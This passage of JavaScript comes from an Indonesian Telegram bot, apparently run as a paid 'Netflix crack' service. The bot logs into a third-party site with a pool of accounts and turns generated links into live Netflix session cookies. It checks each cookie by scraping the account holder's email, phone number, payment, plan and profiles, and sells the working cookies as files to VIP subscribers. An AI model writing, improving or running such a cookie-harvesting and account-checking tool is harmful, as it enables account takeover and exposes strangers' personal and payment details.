            const sinceMatch = html.match(/"memberSince"\s*:\s*"([^"]+)"/) || html.match(/Anggota sejak ([^<]+)/i) || html.match(/Member since ([^<]+)/i);
            if (sinceMatch) memberSince = decodeHexEscapes(sinceMatch[1]).trim();
        }
        if (apiPhone === 'Tidak Terdeteksi') {
            const phoneRegex = html.match(/"phoneNumber"\s*:\s*"([^"]+)"/) || html.match(/"phone"\s*:\s*"([^"]+)"/);
            if (phoneRegex) apiPhone = decodeHexEscapes(phoneRegex[1]).trim();
        }

        if (holdPaymentStatus.includes("HOLD")) {
            if (html.includes('ditolak') || html.includes('declined') || html.includes('failed') || html.includes('tidak dapat memproses')) {
                holdPaymentStatus = "HOLD / SUSPENDED 🔴";
            } else if (nextBill !== 'Not Detected' && nextBill !== null && !html.includes('membership_hold') && !html.includes('paymentRetry')) {
                holdPaymentStatus = "Aman (No Hold) 🟢";
            }
        }

        const whitelistCountries = ['ID', 'US', 'SG'];
        let watchStatus = "✅ Unlocked Region (Bebas VPN)";
        if (country !== 'Not Detected' && !whitelistCountries.includes(country.toUpperCase())) {
            watchStatus = `⚠️ Rawan Geo-Lock (Wajib VPN ${country.toUpperCase()})`;
        }

        let userUsingVPN = "Aman (IP Normal)";
        if (cookieString.includes('nfvdid')) {
            if (html.includes('x-netflix.request.routing') || html.includes('RoutingBypass')) {
                userUsingVPN = "Terdeteksi (Menggunakan VPN Proxy)";
            }
        }

        if (profileNames === 'Not Detected') {
            const profileRegex = /"profileName"\s*:\s*"([^"]+)"/g;
            let match, foundNames = [];
            while ((match = profileRegex.exec(html)) !== null) {
                let decoded = decodeHexEscapes(match[1]);
                if (!foundNames.includes(decoded) && !decoded.includes('{') && decoded.length < 30) foundNames.push(decoded);
            }
            if (foundNames.length > 0) profileNames = foundNames.join(', ');
        }

        if (apiPhone && apiPhone !== 'Tidak Terdeteksi') {
            apiPhone = decodeHexEscapes(apiPhone).replace(/[\x00-\x1F\x7F-\x9F]/g, "").replace(/\\x[0-9A-Fa-f]{2}/g, "");
        }

        const fetchDuration = ((Date.now() - startTimeFetch) / 1000).toFixed(2);

        return { 
            status: 'LIVE', plan, email, country, payment, nextBill, extraMember, 
            authURL, language, memberSince, fetchDuration, profileNames, pinStatus, apiPhone, watchStatus, userUsingVPN,
            holdPaymentStatus
        };
    } catch (error) {
        if (error.response && (error.response.status === 302 || error.response.status === 301)) {
            if(error.response.headers['set-cookie']) return { status: 'LIVE', plan: 'Check Via Link', email: 'Protected', country: 'ID', holdPaymentStatus: "Aman (No Hold) 🟢", watchStatus: "✅ Unlocked Region (Bebas VPN)", userUsingVPN: "Aman (IP Normal)" };
        }
        return { status: 'ERROR', message: error.message };
    }
}

// --- 7. FUNGSI API PENDUKUNG NETFLIX ---
async function fetchPhoneNumberAPI(cookieString) {
    try {
        const headers = { 'Cookie': cookieString, 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0', 'Referer': 'https://www.netflix.com/YourAccount' };
        const response = await axios.get('https://www.netflix.com/api/shakti/v1/account/phone', { headers, timeout: 10000 });
        return response.data?.phoneNumber || 'Tidak Terdeteksi';
    } catch (e) { return 'Tidak Terdeteksi'; }
}

async function generateNfToken(cookieString) {
    try {
        const headers = { ...ARGO_HEADERS, "Cookie": cookieString };
        const queryParams = { appVersion: "15.48.1", path: '["account","token","default"]', pathFormat: "graph", responseFormat: "json" };
        const response = await axios.get(ARGO_API_URL, { params: queryParams, headers, httpsAgent, timeout: 20000 });
        const token = response.data?.value?.account?.token?.default?.token;
        return token ? { success: true, token } : { success: false };
    } catch (error) { return { success: false, message: error.message }; }
}

async function isUserSubscribed(ctx) {
    try {
        const member = await ctx.telegram.getChatMember(REQUIRED_CHANNEL, ctx.from.id);
        return ['creator', 'administrator', 'member', 'restricted'].includes(member.status);
    } catch (error) { return true; }
}

// --- 8. COMMANDS BOT ---
bot.start(async (ctx) => {
    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    saveUser(ctx, ctx.from.id, userDisplay);

    const isSubbed = await isUserSubscribed(ctx);
    if (!isSubbed) {
        return ctx.reply(`🔴 <b>Akses Ditolak!</b>\n\nSilakan join channel kami terlebih dahulu.`, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([[Markup.button.url('🍂 Join Channel', `https://t.me/${REQUIRED_CHANNEL.replace('@', '')}`)]])
        });
    }

    const totalUser = loadUsers().length;
    const options = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' };
    const formattedDate = new Date().toLocaleDateString('id-ID', options);

    const welcomeText = 
        `<b>[ AGASTRA ENTERPRISE - CONTROL PANEL ]</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `English🇬🇧:\n<i>welcome to bot for hit netflix crack automatically, developed by @tCried. Please utilize this utility responsibly and adhere to system regulations to prevent stability issues.</i>\n\nIndoensian🇮🇩\n<i>Selamat datang di bot untuk mendapatkan crack Netflix secara otomatis, yang dikembangkan oleh @tCried. Harap gunakan utilitas ini secara bertanggung jawab dan patuhi peraturan sistem untuk mencegah masalah stabilitas..</i>\n\n` +
        `<blockquote>` +
        `<b>System Status  :</b> <code>Online & Operational</code>\n` +
        `<b>Access Level   :</b> <code>Authorized vip User</code>\n` +
        `<b>Command Usage  :</b> <code>/hit [amount]</code>\n` +
        `</blockquote>\n\n` +
        `<i>Select an option or execute commands below to begin operations.</i>`;

    ctx.reply(welcomeText, { parse_mode: 'HTML' });
});

bot.command('xxxxx', async (ctx) => {
    if (ctx.from.id !== OWNER_ID) {
        return ctx.reply("❌ *Akses Ditolak! Perintah ini khusus Owner CORVAST Store.*", { parse_mode: 'Markdown' });
    }
    const statusBackupMsg = await ctx.reply("📦 `Sedang mencadangkan seluruh sistem panel secara menyeluruh...`", { parse_mode: 'Markdown' });
    try {
        const zip = new AdmZip();
        const currentDir = process.cwd();
        const allFiles = fs.readdirSync(currentDir);
        let filesAdded = 0;

        allFiles.forEach(file => {
            const fullPath = path.join(currentDir, file);
            const stat = fs.statSync(fullPath);

            if (file === 'backup.zip' || file === 'node_modules') return;

            if (stat.isDirectory()) {
                zip.addLocalFolder(fullPath, file);
                filesAdded++;
            } else if (stat.isFile()) {
                zip.addLocalFile(fullPath);
                filesAdded++;
            }
        });

        if (filesAdded === 0) {
            return ctx.telegram.editMessageText(ctx.chat.id, statusBackupMsg.message_id, undefined, "❌ Tidak ada berkas panel yang ditemukan.");
        }

        const zipPath = path.join(currentDir, 'backup.zip');
        zip.writeZip(zipPath);

        await ctx.telegram.sendDocument(ctx.chat.id, { source: zipPath }, {
            caption: `✅ <b>FULL CORE SYSTEM BACKUP COMPLETE</b>\n──────────────────────────\n📊 <b>Status:</b> Berhasil mengamankan seluruh sistem panel.\n🗂️ <b>Item Terkompresi:</b> <code>${filesAdded} Berkas/Folder Utama</code>\n📌 <i>Berkas cadangan ini mencakup index.js, setting .env, dan database json aktif.</i>`,
            parse_mode: 'HTML'
        });
        
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); 
        await ctx.telegram.deleteMessage(ctx.chat.id, statusBackupMsg.message_id).catch(() => {});
    } catch (err) {
        ctx.telegram.editMessageText(ctx.chat.id, statusBackupMsg.message_id, undefined, `⚠️ Gagal memproses full backup: ${err.message}`);
    }
});

// 🌟 VARIABEL UNTUK MELACAK SIAPA YANG SEDANG DIPROSES SAAT INI
let currentTaskDetail = null;
// --- COMMAND CEK ANTREAN ---
bot.command('cekantrian', (ctx) => {
    let message = `📊 <b>STATUS ANTREAN GENERATOR</b>\n━━━━━━━━━━━━━━━━━━━━━\n`;

    if (!currentTaskDetail && hitQueue.length === 0) {
        message += `<i>✅ Antrean saat ini kosong. Bot siap digunakan!</i>`;
        return ctx.reply(message, { parse_mode: 'HTML' });
    }

    // Tampilkan yang sedang diproses
    if (currentTaskDetail) {
        const target = currentTaskDetail.targetTotal === 0 ? 'Max/Unlimited' : currentTaskDetail.targetTotal;
        message += `🔄 <b>SEDANG DIPROSES:</b>\n`;
        message += `👤 ${currentTaskDetail.username}\n`;
        message += `🎯 Progress: <code>${currentTaskDetail.currentCount} / ${target} Link</code>\n\n`;
    }

    // Tampilkan daftar tunggu
    if (hitQueue.length > 0) {
        message += `⏳ <b>DAFTAR TUNGGU (WAITING LIST):</b>\n`;
        hitQueue.forEach((task, index) => {
            const target = task.targetTotal === 0 ? 'Max/Unlimited' : task.targetTotal;
            message += `<b>${index + 1}.</b> ${task.username} ➔ Target: <code>${target} Link</code>\n`;
        });
    }

    message += `━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Gunakan /hit [jumlah] untuk masuk ke antrean.</i>`;
    ctx.reply(message, { parse_mode: 'HTML' });
});

// ==========================================================
// 🌟 COMMAND CEK LIMIT AKUN KXNTU (KHUSUS OWNER)
// ==========================================================
bot.command('ceklimit', async (ctx) => {
    // 1. Verifikasi Akses Khusus Owner
    if (ctx.from.id.toString() !== OWNER_ID.toString()) {
        return ctx.reply("❌ *Akses Ditolak! Perintah ini eksklusif khusus Owner.*", { parse_mode: 'Markdown' });
    }

    const accounts = readAccountsGen();
    if (accounts.length === 0) {
        return ctx.reply("❌ *Data kosong!* Tidak ada akun yang tersimpan di file `account.txt`.", { parse_mode: 'Markdown' });
    }

    // 2. Kirim pesan status awal
    let statusMsg = await ctx.reply(`🔄 <b>Memulai Pengecekan Limit Kxntu...</b>\n\nSedang memproses <b>${accounts.length} akun</b> di background. Proses ini memakan waktu, mohon tunggu...`, { parse_mode: 'HTML' });
    
    let resultText = `📊 <b>LAPORAN LIMIT AKUN KXNTU</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    // Pastikan browser menyala
    if (!globalBrowser) await startGlobalBrowser();

    // 3. Looping Pengecekan Akun
    for (let i = 0; i < accounts.length; i++) {
        const acc = accounts[i];
        let context = null;
        let page = null;
        let limitFound = 'Tidak terbaca';

        try {
            context = await globalBrowser.newContext();
            page = await context.newPage();
            
            // Login ke Kxntu (FIX TERBARU)
            await page.goto('https://kxntu.com/login', { waitUntil: 'domcontentloaded', timeout: 60000 });
            await page.waitForTimeout(2000);
            await page.fill('#l-username', acc.username);
            await page.fill('#l-password', acc.password);
            await page.click('button[type="submit"].btn-primary');
            await page.waitForLoadState('domcontentloaded', { timeout: 60000 });
            await page.waitForTimeout(2000);

            // Menuju halaman generar (FIX TERBARU)
            await page.goto('https://kxntu.com/generar', { waitUntil: 'domcontentloaded', timeout: 60000 });
            await page.waitForTimeout(2000);
            
            // 4. Proses Scrape Label Limit
            // Mengekstrak semua kotak info yang ada di Kxntu
            const infoElements = await page.$$('.kx-kv');
            for (const element of infoElements) {
                const label = (await element.$eval('.k', el => el.textContent.trim()).catch(() => '')).toLowerCase();
                const value = await element.$eval('.v', el => el.textContent.trim()).catch(() => '');
                
                // Cari kata kunci limit/sisa kuota (Bhs Inggris/Spanyol)
                if (label.includes('limit') || label.includes('restante') || label.includes('left') || label.includes('quota') || label.includes('generar')) {
                    limitFound = value;
                    break;
                }
            }
        } catch (err) {
            limitFound = 'Error / Akun Mati';
        } finally {
            // Tutup tab untuk menghemat RAM
            if (page) await page.close().catch(()=>{});
            if (context) await context.close().catch(()=>{});
        }
        
        // Format teks hasil
        let iconStatus = limitFound.includes('Error') ? '🔴' : (limitFound === '0' ? '⚠️' : '🟢');
        resultText += `${iconStatus} <code>${acc.username}</code> ➔ <b>Limit:</b> ${limitFound}\n`;
        
        // Update pesan secara berkala agar Telegram tidak limit spam (tiap 3 akun)
        if ((i + 1) % 3 === 0 || i === accounts.length - 1) {
            await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, resultText + `\n<i>⏳ Progress: ${i + 1} dari ${accounts.length} akun dicek...</i>`, { parse_mode: 'HTML' }).catch(()=>{});
        }
    }

    // 5. Update Pesan Final Selesai
    const finalMessage = resultText + `━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>Pengecekan selesai 100%!</b>`;
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, finalMessage, { parse_mode: 'HTML' }).catch(()=>{});
});

// ==========================================================
// 🌟 COMMAND HIT DENGAN SISTEM SMART QUEUE / WAITING LIST
// ==========================================================
bot.command('hit', async (ctx) => {
    const currentUserId = ctx.from.id.toString();
    const isOwner = currentUserId === OWNER_ID.toString();
    
    const users = loadUsers();
    const userRecord = users.find(u => u.id.toString() === currentUserId);
    
    // Cek apakah VIP masih aktif (jika ada masa berlakunya)
    let isVip = false;
    if (userRecord && userRecord.isVip === true) {
        if (!userRecord.vipExpiredAt || new Date() < new Date(userRecord.vipExpiredAt)) {
            isVip = true;
        }
    }

    if (!isOwner && !isVip) {
        return ctx.reply('❌ *Akses Ditolak:*\nCommand ini khusus Owner dan user VIP.', { parse_mode: 'Markdown' });
    }

    const args = ctx.message.text.split(' ');
    
    if (args.length < 2 || args[1].trim() === '' || isNaN(parseInt(args[1]))) {
        return ctx.reply('⚠️ *Format salah!*\nGunakan format: `/hit <jumlah_link>`\nContoh: `/hit 5`\n*(Ketik /hit 0 untuk tanpa batas/habiskan akun)*', { parse_mode: 'Markdown' });
    }
    
    // 👉 BARIS INI PENTING (Mendefinisikan targetTotal)
    let targetTotal = parseInt(args[1]);

    // 👉 BATASAN MAKSIMAL 50 UNTUK SEMUA ORANG (TERMASUK OWNER)
    if (targetTotal === 0 || targetTotal > 50) {
        targetTotal = 50;
        ctx.reply('⚠️ *INFO SISTEM:*\nPermintaan disesuaikan menjadi maksimal *50 link* per eksekusi untuk menjaga performa bot.', { parse_mode: 'Markdown' });
    }

    // 🌟 PROTEKSI DOUBLE HIT
    const isInQueue = hitQueue.some(task => task.userId === currentUserId);
    const isCurrentlyProcessing = currentTaskDetail && currentTaskDetail.userId === currentUserId;

    if (isInQueue || isCurrentlyProcessing) {
        return ctx.reply('⏳ <b>KAMU TELAH MENGANTRI!</b>\n\nKamu sudah ada di dalam sistem antrean atau prosesmu sedang berjalan. Silakan tunggu sampai prosesmu selesai atau cek menggunakan /cekantrian.', { parse_mode: 'HTML' });
    }

    const usernameDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

    // MASUKKAN USER KE DALAM ANTREAN
    hitQueue.push({
        ctx: ctx,
        targetTotal: targetTotal,
        userId: currentUserId,
        username: usernameDisplay
    });

    const queuePosition = hitQueue.length;

    // CEK APAKAH BOT SEDANG SIBUK?
    if (isProcessingHit) {
        return ctx.reply(`⏳ <b>SEDANG ADA YANG HIT NETFLIX!</b>\n\nAntrian kamu ke: <b>${queuePosition}</b>\n<i>Mohon tunggu sampai pengguna sebelumnya selesai, proses kamu akan berjalan otomatis.</i>\n\n👉 Gunakan /cekantrian untuk melihat posisi.`, { parse_mode: 'HTML' });
    } else {
        processNextHit();
    }
}); 

// ==========================================================
// 🌟 FUNGSI PEKERJA ANTREAN (FULL FIX & OPTIMIZED)
// ==========================================================
async function processNextHit() {
    // 1. Jika antrean kosong, matikan status sibuk & kosongkan tracker
    if (hitQueue.length === 0) {
        isProcessingHit = false;
        currentTaskDetail = null;
        return;
    }

    // 2. Kunci bot agar menandai sedang ada proses berjalan
    isProcessingHit = true;
    
    // Ambil tugas urutan pertama dari antrean
    const currentTask = hitQueue.shift();
    const { ctx, targetTotal, userId, username } = currentTask;

    // Set tracker untuk /cekantrian
    currentTaskDetail = {
        userId: userId,
        username: username,
        targetTotal: targetTotal,
        currentCount: 0
    };

    try {
        await ctx.reply(`🚀 <b>SEKARANG BAGIAN KAMU!</b>\nProses hit Netflix sedang dimulai...`, { parse_mode: 'HTML' });

        const accounts = readAccountsGen();
        if (accounts.length === 0) {
            await ctx.reply('❌ File `account.txt` kosong atau tidak ditemukan!');
            return; // Lanjut ke blok finally untuk mereset status
        }

        // Tampilan Premium Awal (Initializing)
        const layoutInit = `<b>[ CORVAST ENTERPRISE - INITIALIZATION CORE ]</b>\n` +
                           `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                           `<i>Initializing automated headless browser environment...</i>\n\n` +
                           `<blockquote>` +
                           `<b>Database Pool  :</b> <code>${accounts.length} Total Accounts</code>\n` +
                           `<b>Target Quota   :</b> <code>${targetTotal === 0 ? 'Unlimited' : targetTotal} Valid Account</code>\n` +
                           `<b>Bypass Engine  :</b> <code>Playwright Stealth Cluster</code>\n` +
                           `<b>Queue Priority :</b> <code>Assigned & Locked</code>\n` +
                           `</blockquote>\n\n` +
                           `<i>Status: Spawning browser instance and preparing target context...</i>`;
                           
        let statusMsg = await ctx.reply(layoutInit, { parse_mode: 'HTML' });
        const allResults = [];
        let processedAccountsCount = 0;
        let akunDicoba = 0;

        // ⚡ AUTO-REVIVE BROWSER: Cek apakah browser masih nyala, kalau mati/crash, nyalain lagi!
        if (!globalBrowser || !globalBrowser.isConnected()) {
            console.log("⚠️ Browser terdeteksi mati! Merestart global browser...");
            await startGlobalBrowser();
        }
        
        while (akunDicoba < accounts.length) {
            // 👉 TARUH PENGECEKAN JUGA DI DALAM LOOP (Jaga-jaga mati di tengah jalan)
            if (!globalBrowser || !globalBrowser.isConnected()) {
                await startGlobalBrowser();
            }
            if (targetTotal > 0 && allResults.length >= targetTotal) break;

            const account = accounts[globalAccountIndex];
            globalAccountIndex = (globalAccountIndex + 1) % accounts.length; 
            akunDicoba++;

            // Tampilan Premium Login
            const layoutLogin = `<b>[ CORVAST ENTERPRISE - AUTHENTICATION MODULE ]</b>\n` +
                                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                `<i>Establishing secure connection to target portal...</i>\n\n` +
                                `<blockquote>` +
                                `<b>Target Account :</b> <code>${account.username}</code>\n` +
                                `<b>Execution Flow :</b> <code>Node ${akunDicoba} of ${accounts.length}</code>\n` +
                                `<b>Target Quota   :</b> <code>${allResults.length} / ${targetTotal === 0 ? 'Unlimited' : targetTotal} Valid Account</code>\n` +
                                `<b>Session State  :</b> <code>Pending Authorization</code>\n` +
                                `</blockquote>\n\n` +
                                `<i>Status: Authenticating credentials and submitting login payload...</i>`;
            await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, layoutLogin, { parse_mode: 'HTML' }).catch(()=>{});
            
            let context = null;
            let page = null;
            let shouldContinue = true;

            try {
                context = await globalBrowser.newContext();
                page = await context.newPage();

                // FIX TERBARU - Anti Spaming & Cloudflare Bypass Method
                await page.goto('https://kxntu.com/login', { waitUntil: 'domcontentloaded', timeout: 60000 });
                await page.waitForTimeout(2000); // Jeda extra biar form sempurna muncul
                await page.fill('#l-username', account.username);
                await page.fill('#l-password', account.password); 
                await page.click('button[type="submit"].btn-primary');
                await page.waitForLoadState('domcontentloaded', { timeout: 60000 });
                await page.waitForTimeout(2000);

                await page.goto('https://kxntu.com/generar', { waitUntil: 'domcontentloaded', timeout: 60000 });
                await page.waitForTimeout(2000);

                let iterasiAkun = 0;
                let consecutiveDuplicates = 0; // 🌟 PELACAK DUPLIKAT BERTURUT-TURUT (ANTI-STUCK)

                while (shouldContinue) {
                    if (targetTotal > 0 && allResults.length >= targetTotal) {
                        shouldContinue = false;
                        break;
                    }

                    iterasiAkun++;
                    
                    // Tampilan Premium Scraping
                    const layoutScraping = `<b>[ CORVAST ENTERPRISE - EXTRACTION ENGINE ]</b>\n` +
                                           `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                           `<i>Executing automated data mining sequence...</i>\n\n` +
                                           `<blockquote>` +
                                           `<b>Target Account :</b> <code>${account.username}</code>\n` +
                                           `<b>Execution Flow :</b> <code>Node ${akunDicoba} of ${accounts.length}</code>\n` +
                                           `<b>Scrape Iteration:</b> <code>Attempt #${iterasiAkun}</code>\n` +
                                           `<b>Target Quota   :</b> <code>${allResults.length} / ${targetTotal === 0 ? 'Unlimited' : targetTotal} Valid Account</code>\n` +
                                           `<b>Tunnel Status  :</b> <code>Active & Stable</code>\n` +
                                           `</blockquote>\n\n` +
                                           `<i>Status: Scraping target database and harvesting session payloads...</i>`;
                    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, layoutScraping, { parse_mode: 'HTML' }).catch(()=>{});

                    await page.click('#btn-link');
                    const link = await getLinkFromCodeboxGen(page);
                    
                    if (!link) {
                        // Limit harian akun kxntu habis / tidak ada link, lanjut ke akun selanjutnya
                        shouldContinue = false; 
                        break;
                    }

                    const hasPartner = await checkPartnerGen(page);
                    if (hasPartner) {
                        await page.waitForTimeout(800);
                        continue; 
                    }

                    // ⚡ SPEED HACK: Mulai proses ekstrak cookie ke Netflix di BACKGROUND
                    const cookiePromise = resolveLinkToCookie(link);

                    // ⚡ SPEED HACK: Sambil nunggu server Netflix balas, bot ngerjain tugas baca Plan & Country
                    let hitCountry = 'Global / UN';
                    let hitPlan = 'Netflix Plan';
                    try {
                        const infoElements = await page.$$('.kx-kv');
                        for (const element of infoElements) {
                            const label = (await element.$eval('.k', el => el.textContent.trim()).catch(() => '')).toLowerCase();
                            const value = await element.$eval('.v', el => el.textContent.trim()).catch(() => '');
                            
                            if (value) {
                                if (label.includes('plan') || label.includes('paket')) {
                                    hitPlan = value;
                                }
                                if (label.includes('country') || label.includes('negara') || label.includes('region') || label.includes('país') || label.includes('pais')) {
                                    hitCountry = value;
                                }
                            }
                        }
                    } catch (e) {}

                    // ⚡ SPEED HACK: Gabungkan delay wajib Kxntu (1 dtk) selagi proses axios berjalan biar gak dobel nunggu!
                    await page.waitForTimeout(1000);

                    // Cek hasil akhir dari proses ekstrak background tadi
                    const activeCookie = await cookiePromise;
                    if (!activeCookie) {
                        // Jika mati, langsung lanjut generate link baru (gak ada delay tambahan lagi)
                        continue; 
                    }

                    allResults.push({ 
                        username: account.username, 
                        link: link, 
                        cookie: activeCookie, 
                        country: hitCountry, 
                        plan: hitPlan 
                    });
                    
                    // Update progress angka untuk /cekantrian
                    currentTaskDetail.currentCount = allResults.length;
                } 
                
                processedAccountsCount++;
            } catch (error) {
                console.error(`Error pada akun ${account.username}:`, error.message);
                await notifyOwnerError(ctx, `Scraping Akun Kxntu: ${account.username}`, error);
            } finally {
                // Bersihkan halaman dan konteks browser agar tidak memakan RAM
                if (page) await page.close().catch(()=>{});
                if (context) await context.close().catch(()=>{});
            }

            if (akunDicoba < accounts.length && (targetTotal === 0 || allResults.length < targetTotal)) {
                await new Promise(resolve => setTimeout(resolve, 1000)); 
            }
        } 
        
        // Tampilan Premium Selesai
        const resultText = `<b>[ CORVAST ENTERPRISE - TASK EXECUTION COMPLETED ]</b>\n` +
                           `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                           `<i>All automated operations in the queue have been successfully processed.</i>\n\n` +
                           `<blockquote>` +
                           `<b>Accounts Processed :</b> <code>${processedAccountsCount} Total Nodes</code>\n` +
                           `<b>Target Quota Target:</b> <code>${targetTotal === 0 ? 'Unlimited' : targetTotal} Account</code>\n` +
                           `<b>Harvested Valid   :</b> <code>${allResults.length} Account Found</code>\n` +
                           `<b>Operation Metric  :</b> <code>100% Success Rate</code>\n` +
                           `<b>Queue Status      :</b> <code>Released & Cleared</code>\n` +
                           `</blockquote>\n\n` +
                           `<i>Status: Database package compiled securely and dispatched below. Please check the file!</i> ⬇️`;
                           
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, resultText, { parse_mode: 'HTML' }).catch(()=>{});
        
        const sisaTarget = targetTotal > 0 ? targetTotal - allResults.length : 0;

        if (allResults.length > 0) {
            // Hitung jumlah tiap negara
            const countryCounts = {};
            allResults.forEach(item => {
                const detail = getCountryDetail(item.country);
                const countryLabel = detail.flag ? `${detail.flag} ${detail.name}` : detail.name;
                countryCounts[countryLabel] = (countryCounts[countryLabel] || 0) + 1;
            });
            const countriesSummary = Object.entries(countryCounts)
                .map(([name, count]) => `${name} ${count}`)
                .join(' | ');

            // Hitung jumlah tiap plan
            const planCounts = {};
            allResults.forEach(item => {
                const planLabel = item.plan || 'Netflix Plan';
                planCounts[planLabel] = (planCounts[planLabel] || 0) + 1;
            });
            const plansSummary = Object.entries(planCounts)
                .map(([name, count]) => `${name} ${count}`)
                .join(' | ');

            // 👉 UBAH OUTPUT FILE: HANYA MENGANDUNG COOKIES AKTIF (TANPA USERNAME/LINK)
            const textContent = allResults.map(item => item.cookie).join('\n');
            const fileBuffer = Buffer.from(textContent, 'utf8');
            
            // 👉 HAPUS FITUR TOMBOL EKSTRAK & CACHE KARENA SUDAH OTOMATIS
            let inlineButtons = [];

            if (sisaTarget > 0) {
                inlineButtons.push([Markup.button.callback(`🔄 Auto-Retry Sisa Target (${sisaTarget} Target)`, `retry_hit_${sisaTarget}`)]);
            }

            // 1. Kirim Ringkasan sebagai Teks Biasa (Aman dari limit caption dokumen Telegram)
            await ctx.reply(
                `<b>[ CORVAST ENTERPRISE - RESULT SUMMARY ]</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `<i>Harvested database results package summary report.</i>\n\n` +
                `<blockquote>` +
                `<b>Total Cookies Live :</b> <code>${allResults.length} Cookies Harvested</code>\n` +
                `<b>Countries Hit   :</b> <code>${countriesSummary || 'Global / UN'}</code>\n` +
                `<b>Plan Breakdown  :</b> <code>${plansSummary || 'Netflix Plan'}</code>\n` +
                `<b>Package Status  :</b> <code>Secured & Verified Live</code>\n` +
                `</blockquote>\n\n` +
                `English 🇬🇧 :\n` +
                `<i>Successfully hit cookies, if you want to tidy up the cookie format and check live/dead cookies, please forward this file to the bot @corvastcookie_bot so that it can be automatically sorted.</i>\n\n` +
                `Indonesian 🇮🇩 :\n` +
                `<i>Berhasil hit cookies, jika ingin merapihkan format cookies dan cek cookies live/dead silahkan forward file ini ke bot CONVERTNETFL@IX_BOT agar otomatis di sortir</i>`,
                { parse_mode: 'HTML' }
            );

            // 2. Kirim Dokumennya dengan Caption Singkat + Tombol Interaktif
            await ctx.replyWithDocument(
                { source: fileBuffer, filename: 'hasil_hit_cookies_live.txt' }, 
                { 
                    caption: `📁 <b>File Hasil Hit Cookies Live (${allResults.length} Akun)</b>`,
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard(inlineButtons)
                }
            );
        } else {
            let failureMsg = `⚠️ <b>Proses Selesai: Limit harian akun kxntu habis atau tidak ada link valid.</b>`;
            let kb = [];
            if (sisaTarget > 0) {
                failureMsg += `\nApakah Anda ingin mencoba ulang antrean untuk ${sisaTarget} target?`;
                kb.push([Markup.button.callback(`🔄 Auto-Retry Sisa Target (${sisaTarget} Link)`, `retry_hit_${sisaTarget}`)]);
            }
            await ctx.reply(failureMsg, { parse_mode: 'HTML', ...Markup.inlineKeyboard(kb) });
        }
    } catch (error) {
        console.error("Error Generate Bot:", error);
        await notifyOwnerError(ctx, "Sistem processNextHit (Global)", error);
        await ctx.reply(`❌ *Terjadi Kesalahan Kritis:*\n${error.message}`, { parse_mode: 'Markdown' });
    } finally {
        // 🌟 RESET STATUS PADA AKHIR PROSES SEBELUM MEMANGGIL TUGAS BERIKUTNYA
        isProcessingHit = false;
        currentTaskDetail = null;

        // Jika masih ada antrean lain di belakang, jalankan otomatis
        if (hitQueue.length > 0) {
            processNextHit(); 
        }
    }
}

// ==========================================================
// 🌟 COMMAND /ADDVIP DENGAN DURASI (CONTOH: /addvip @user 30d ATAU lifetime)
// ==========================================================
bot.command('addvip', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) {
        return ctx.reply("❌ *Akses Ditolak! Perintah ini khusus Owner.*", { parse_mode: 'Markdown' });
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply("⚠️ *Format Salah!*\n\nGunakan format:\n`/addvip @username [durasi]`\n\n*Contoh Durasi:*\n• `30d` (30 Hari)\n• `2m` atau `2b` (2 Bulan)\n• `lifetime` (Selamanya)", { parse_mode: 'Markdown' });
    }

    let target = args[1].replace('@', ''); // Hapus '@'
    let durationInput = args[2].toLowerCase();
    
    let users = loadUsers();
    let userIndex = users.findIndex(u => 
        (u.username && u.username.replace('@', '').toLowerCase() === target.toLowerCase()) || 
        u.id.toString() === target
    );

    if (userIndex === -1) {
        return ctx.reply(`❌ *User tidak ditemukan di database!*\nPastikan user tersebut sudah pernah klik /start di bot ini sebelumnya.`, { parse_mode: 'Markdown' });
    }

    let expiredDate = null;
    let durationText = "";

    if (durationInput === 'lifetime') {
        expiredDate = null;
        durationText = "Selamanya (Lifetime)";
    } else {
        let days = 0;
        const matchDays = durationInput.match(/^(\d+)d$/);
        const matchMonths = durationInput.match(/^(\d+)(m|b)$/);

        if (matchDays) {
            days = parseInt(matchDays[1]);
        } else if (matchMonths) {
            days = parseInt(matchMonths[1]) * 30;
        } else {
            return ctx.reply("⚠️ *Format durasi tidak valid!*\nGunakan format seperti `30d` untuk hari atau `2m` untuk bulan.", { parse_mode: 'Markdown' });
        }

        expiredDate = new Date();
        expiredDate.setDate(expiredDate.getDate() + days);
        durationText = expiredDate.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
    }

    // Set Status VIP dan Tanggal Expired
    users[userIndex].isVip = true;
    users[userIndex].vipExpiredAt = expiredDate ? expiredDate.toISOString() : null;
    fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));

    ctx.reply(`✅ <b>BERHASIL MENAMBAHKAN VIP!</b>\n──────────────────────────\n👤 <b>User:</b> <code>${users[userIndex].username}</code>\n🆔 <b>ID:</b> <code>${users[userIndex].id}</code>\n⏳ <b>Masa Aktif VIP:</b> <b>${durationText}</b>`, { parse_mode: 'HTML' });
});

// ==========================================================
// 🌟 COMMAND /DELVIP UNTUK MENGHAPUS STATUS VIP USER
// ==========================================================
bot.command('delvip', async (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) {
